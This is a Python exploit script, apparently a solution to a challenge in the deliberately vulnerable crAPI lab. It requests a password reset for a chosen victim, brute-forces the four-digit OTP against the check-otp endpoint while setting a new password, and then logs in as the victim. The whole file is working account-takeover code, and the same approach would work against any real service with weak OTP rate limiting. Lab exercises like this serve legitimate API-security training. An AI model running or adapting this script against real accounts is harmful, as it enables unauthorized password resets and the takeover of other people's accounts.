#!/usr/bin/env python3
"""Challenge 3: Reset another user's password (Broken Auth + OTP Brute-Force)"""
import argparse, sys, time, random
from pathlib import Path
from typing import Optional
import requests, yaml

def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)

def request_password_reset(base_url: str, email: str, timeout: float = 15) -> bool:
    try:
        r = requests.post(f"{base_url.rstrip('/')}/identity/api/auth/forget-password",
                         json={"email": email}, timeout=timeout)
        return r.status_code in (200, 201)
    except:
        return False

def verify_otp_and_reset(base_url: str, email: str, otp: str, new_password: str, timeout: float = 15) -> bool:
    try:
        r = requests.post(f"{base_url.rstrip('/')}/identity/api/auth/v2/check-otp",
                         json={"email": email, "otp": otp, "password": new_password}, timeout=timeout)
        if r.status_code in (200, 201):
            data = r.json()
            return "OTP verified" in data.get("message", "")
        return False
    except:
        return False

def attempt_login(base_url: str, email: str, password: str, timeout: float = 15) -> Optional[str]:
    try:
        r = requests.post(f"{base_url.rstrip('/')}/identity/api/auth/login",
                         json={"email": email, "password": password}, timeout=timeout)
        if r.status_code == 200:
            return r.json().get("token")
    except:
        pass
    return None

def main():
    parser = argparse.ArgumentParser(description="Challenge 3: Broken Auth - Password Reset")
    parser.add_argument("--config", default="../crapi_config.yaml")
    parser.add_argument("--victim-email")
    parser.add_argument("--new-password", default="Hacked123!")
    parser.add_argument("--otp-start", type=int, default=0)
    parser.add_argument("--otp-end", type=int, default=9999)
    args = parser.parse_args()

    cfg = load_config(Path(args.config))
    base_url = cfg["target"]["base_url"]
    num_users = cfg["known_users"].get("num_users", 50)

    print(f"[*] Challenge 3: Broken Auth - Password Reset\n[*] Target: {base_url}\n" + "-"*60)

    if not args.victim_email:
        args.victim_email = f"mike{random.randint(1, num_users)}@my.lab"
    print(f"[+] Target victim: {args.victim_email}")

    if not request_password_reset(base_url, args.victim_email):
        print("[!] Failed to request reset"); sys.exit(1)
    print(f"[+] OTP sent to {args.victim_email}")
    time.sleep(2)

    print(f"[*] Brute-forcing OTP ({args.otp_start:04d}-{args.otp_end:04d})...")
    found_otp = None
    for otp_num in range(args.otp_start, args.otp_end + 1):
        if verify_otp_and_reset(base_url, args.victim_email, f"{otp_num:04d}", args.new_password):
            found_otp = f"{otp_num:04d}"
            print(f"\n[+] SUCCESS! Valid OTP: {found_otp}")
            break
        if (otp_num + 1) % 100 == 0:
            print(f"[*] Tried {otp_num + 1} OTPs...")
        time.sleep(0.05)

    if not found_otp:
        print("[!] OTP brute-force failed"); sys.exit(1)

    token = attempt_login(base_url, args.victim_email, args.new_password)
    if token:
        print(f"[+] SUCCESS! Logged in as victim")
        print(f"[!] VULNERABLE: Can reset another user's password via OTP brute-force")
    else:
        print("[!] Login verification failed")

if __name__ == "__main__":
    main()
